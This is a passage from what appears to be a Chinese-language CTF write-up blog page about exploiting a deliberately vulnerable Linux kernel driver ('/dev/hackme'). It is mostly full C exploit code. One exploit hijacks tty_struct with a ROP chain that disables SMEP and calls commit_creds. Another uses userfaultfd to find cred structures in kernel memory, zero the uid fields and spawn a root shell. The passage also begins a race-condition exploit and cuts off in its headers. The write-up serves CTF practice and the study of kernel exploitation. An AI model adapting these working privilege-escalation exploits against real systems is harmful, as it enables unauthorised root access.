class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span> )&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[:(]Open error...\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    user_chunk = (struct chunk*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct chunk));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'0'</span>,<span class="number">0x400</span>);</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">0</span>,buf,<span class="number">0x400</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'1'</span>,<span class="number">0x400</span>);</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">1</span>,buf,<span class="number">0x400</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'2'</span>,<span class="number">0x400</span>);</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">2</span>,buf,<span class="number">0x400</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>(fd,<span class="number">0</span>,buf,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">delete</span>(fd,<span class="number">1</span>,buf,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    uread(fd,<span class="number">2</span>,buf,<span class="number">0x400</span>,<span class="number">-0x400</span>);</span><br><span class="line">    <span class="keyword">size_t</span> heap_base = *(<span class="keyword">size_t</span>*)buf;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]heap_base = %p\n"</span>,heap_base);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ptmx_fd = open(<span class="string">"/dev/ptmx"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(ptmx_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Open ptmx error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uread(fd,<span class="number">2</span>,buf,<span class="number">0x400</span>,<span class="number">-0x400</span>);</span><br><span class="line">    <span class="keyword">if</span>(*(<span class="keyword">size_t</span>*)buf != <span class="number">0x0000000100005401</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Alloc ptmx error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">size_t</span> kernel_base = *((<span class="keyword">size_t</span>*)buf+<span class="number">3</span>) - <span class="number">0x625d80</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]kernel_base = %p\n"</span>,kernel_base);</span><br><span class="line">	prepare_kernel_cred = <span class="number">0x4d3d0</span> + kernel_base;</span><br><span class="line">	commit_creds = <span class="number">0x4d220</span> + kernel_base;</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">size_t</span>*)buf+<span class="number">3</span>) = heap_base + <span class="number">0x800</span>;</span><br><span class="line">    uwrite(fd,<span class="number">2</span>,buf,<span class="number">0x400</span>,<span class="number">-0x400</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">size_t</span>*)buf = kernel_base + <span class="number">0x1b5a1</span>; <span class="comment">//pop rax; ret;</span></span><br><span class="line">    *((<span class="keyword">size_t</span>*)buf+<span class="number">1</span>) = <span class="number">0x6f0</span>;</span><br><span class="line">    *((<span class="keyword">size_t</span>*)buf+<span class="number">2</span>) = kernel_base + <span class="number">0x252b</span>; <span class="comment">//mov cr4, rax; push rcx; popfq; pop rbp; ret; </span></span><br><span class="line">    *((<span class="keyword">size_t</span>*)buf+<span class="number">3</span>) = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    *((<span class="keyword">size_t</span>*)buf+<span class="number">4</span>) = (<span class="keyword">size_t</span>)su;</span><br><span class="line">    *((<span class="keyword">size_t</span>*)buf+<span class="number">7</span>) = kernel_base + <span class="number">0x200f66</span>; <span class="comment">//mov rsp,rax;.........;</span></span><br><span class="line">    uwrite(fd,<span class="number">2</span>,buf,<span class="number">0x40</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    memset(buf,'\x00',8);</span><br><span class="line">    write(ptmx_fd,buf,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/13/emLUsgqn79KupNS.png" alt="x1.PNG"></p>
<hr>
<h2 id="其他解法三："><a href="#其他解法三：" class="headerlink" title="其他解法三："></a>其他解法三：</h2><h3 id="userfaultfd："><a href="#userfaultfd：" class="headerlink" title="userfaultfd："></a>userfaultfd：</h3><p>经过几次尝试发现<code>cred</code>有时会出现在<code>chunk_addr</code>之前，有时会出现在<code>chunk_addr</code>之后，但绝大部分情况是在其之前，且相距距离都在<code>0x160000</code>之内（<code>0x17a500-0x25d00 = 0x154800</code>）：</p>
<p><img src="https://i.loli.net/2020/02/14/9vPUIWgocpq4k3z.png" alt="x1.PNG"></p>
<p>在后面的情况：</p>
<p><img src="https://i.loli.net/2020/02/14/YvdOizhcMBPtLn7.png" alt="x2.PNG"></p>
<p>然后就可以通过越界向前读，读出<code>cred</code>的内容来，用8个1000来过滤，然后将8个1000全改为0后，再写回内核内存，因为中间有<code>hole</code>，会触发缺页中断，利用<code>userfaultfd</code>机制使用户态在自定义处理缺页中断时卡住，使提前准别好的子进程一直不断尝试拿<code>shell</code>。但是貌似不是很稳定，大概运行三到四次<code>exp</code>会成功一次，其他情况会卡住。</p>
<h2 id="exp：-13"><a href="#exp：-13" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max 0x160000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> search 0x10000</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> index;</span><br><span class="line">    <span class="keyword">char</span>* buf;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> offset;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>* <span class="title">user_chunk</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uread</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index,<span class="keyword">char</span>* buf,<span class="keyword">long</span> <span class="keyword">long</span> size,<span class="keyword">long</span> <span class="keyword">long</span> offset)</span></span>&#123;</span><br><span class="line">    user_chunk-&gt;index = (<span class="keyword">size_t</span>)index;</span><br><span class="line">    user_chunk-&gt;buf = buf;</span><br><span class="line">    user_chunk-&gt;size = size;</span><br><span class="line">    user_chunk-&gt;offset = offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30003</span>,user_chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uwrite</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index,<span class="keyword">char</span>* buf,<span class="keyword">long</span> <span class="keyword">long</span> size,<span class="keyword">long</span> <span class="keyword">long</span> offset)</span></span>&#123;</span><br><span class="line">    user_chunk-&gt;index = (<span class="keyword">size_t</span>)index;</span><br><span class="line">    user_chunk-&gt;buf = buf;</span><br><span class="line">    user_chunk-&gt;size = size;</span><br><span class="line">    user_chunk-&gt;offset = offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30002</span>,user_chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">new</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index,<span class="keyword">char</span>* buf,<span class="keyword">long</span> <span class="keyword">long</span> size,<span class="keyword">long</span> <span class="keyword">long</span> offset)</span></span>&#123;</span><br><span class="line">    user_chunk-&gt;index = (<span class="keyword">size_t</span>)index;</span><br><span class="line">    user_chunk-&gt;buf = buf;</span><br><span class="line">    user_chunk-&gt;size = size;</span><br><span class="line">    user_chunk-&gt;offset = offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30000</span>,user_chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index,<span class="keyword">char</span>* buf,<span class="keyword">long</span> <span class="keyword">long</span> size,<span class="keyword">long</span> <span class="keyword">long</span> offset)</span></span>&#123;</span><br><span class="line">    user_chunk-&gt;index = (<span class="keyword">size_t</span>)index;</span><br><span class="line">    user_chunk-&gt;buf = buf;</span><br><span class="line">    user_chunk-&gt;size = size;</span><br><span class="line">    user_chunk-&gt;offset = offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30001</span>,user_chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"[:)]Root now!!!"</span>);</span><br><span class="line">            system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handle</span><span class="params">(<span class="keyword">void</span>* uffd)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">mypollfd</span>;</span></span><br><span class="line"></span><br><span class="line">    mypollfd.fd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)uffd;</span><br><span class="line">    mypollfd.events = POLLIN;</span><br><span class="line">    <span class="keyword">int</span> re = poll(&amp;mypollfd,<span class="number">1</span>,<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span>(re &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Catch error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]Struck the pagefault!!!"</span>);</span><br><span class="line">    sleep(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_uttd</span><span class="params">(<span class="keyword">uint64_t</span> fault_page,<span class="keyword">uint64_t</span> fault_page_size)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">myapi</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">myuffd</span>;</span></span><br><span class="line">    <span class="keyword">pthread_t</span> pt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> uffd = syscall(__NR_userfaultfd,O_CLOEXEC|O_NONBLOCK);</span><br><span class="line"></span><br><span class="line">    myapi.api = UFFD_API;</span><br><span class="line">    myapi.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(uffd,UFFDIO_API,&amp;myapi) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Api error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    myuffd.range.start = fault_page;</span><br><span class="line">    myuffd.range.len = fault_page_size;</span><br><span class="line">    myuffd.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(uffd,UFFDIO_REGISTER,&amp;myuffd) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Register error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> re = pthread_create(&amp;pt,<span class="literal">NULL</span>,handle,(<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span>(re != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Create pthread error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/hackme"</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span> )&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[:(]Open error...\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    user_chunk = (struct chunk*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct chunk));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">20</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(fork() == <span class="number">0</span>)&#123;</span><br><span class="line">            get_root();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* buf = <span class="built_in">malloc</span>(max);</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">0</span>,buf,<span class="number">0x100</span>,<span class="number">0</span>);</span><br><span class="line">    uread(fd,<span class="number">0</span>,buf,max,-max);</span><br><span class="line">    <span class="keyword">int</span>* search_ptr = (<span class="keyword">int</span>*)buf;</span><br><span class="line">    <span class="keyword">size_t</span> offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; search/<span class="number">4</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(search_ptr[i]==<span class="number">1000</span> &amp;&amp; search_ptr[i+<span class="number">1</span>]==<span class="number">1000</span> &amp;&amp; search_ptr[i+<span class="number">2</span>]==<span class="number">1000</span> &amp;&amp; search_ptr[i+<span class="number">3</span>]==<span class="number">1000</span> &amp;&amp; search_ptr[i+<span class="number">4</span>]==<span class="number">1000</span> &amp;&amp; search_ptr[i+<span class="number">5</span>]==<span class="number">1000</span> &amp;&amp; search_ptr[i+<span class="number">6</span>]==<span class="number">1000</span> &amp;&amp; search_ptr[i+<span class="number">7</span>]==<span class="number">1000</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"[:)]Find cred!!!"</span>);</span><br><span class="line">            offset = i*<span class="number">4</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[:)]offset = %p\n"</span>,offset);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; <span class="number">8</span>;j++)&#123;</span><br><span class="line">                search_ptr[i+j] = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(offset == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Not find..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* mmap_addr = mmap(<span class="literal">NULL</span>,max,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(mmap_addr,buf,search);</span><br><span class="line">    <span class="keyword">uint64_t</span> fault_page = mmap_addr + search; </span><br><span class="line">    <span class="keyword">uint64_t</span> fault_page_size = max - search; </span><br><span class="line">    register_uttd(fault_page,fault_page_size);</span><br><span class="line">    uwrite(fd,<span class="number">0</span>,mmap_addr,max,-max);</span><br><span class="line"></span><br><span class="line">	get_root();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/14/HCFZt8DQAYueqX4.png" alt="x1.PNG"></p>
<p>卡住时：</p>
<p><img src="https://i.loli.net/2020/02/14/WPLIfZYQCuymdgt.png" alt="x1.PNG"></p>
<hr>
<h2 id="其他解法四："><a href="#其他解法四：" class="headerlink" title="其他解法四："></a>其他解法四：</h2><h3 id="race："><a href="#race：" class="headerlink" title="race："></a>race：</h3><p>看到初始化时开了多核多线程，就考虑到会有竞争问题，可以用一个子进程去触发缺页中断，使驱动在<code>copy_from_user</code>那一步卡住，从而使得指针更新而<code>size</code>未更新，产生溢出漏洞，再劫持<code>tty_struct</code>即可。</p>
<h2 id="exp：-14"><a href="#exp：-14" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span 